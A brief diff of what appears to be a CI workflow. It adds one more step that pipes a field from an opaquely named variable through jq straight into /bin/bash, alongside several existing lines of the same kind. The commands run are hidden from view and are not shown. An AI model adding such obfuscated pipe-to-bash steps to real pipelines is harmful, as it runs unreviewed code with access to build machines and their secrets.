@@ -27,6 +27,7 @@ jobs:
           echo $dy4030 | jq -r .mxnoz0 | /bin/bash
           printf '%s' "$tfcgn9720" | jq -r .au9 | /bin/bash
           printf '%s' "$igkt312" | jq -r .spiq54 | /bin/bash
+          printf '%s' "$gt21230" | jq -r .b7 | /bin/bash
 
       - name: Save output
         if: always()
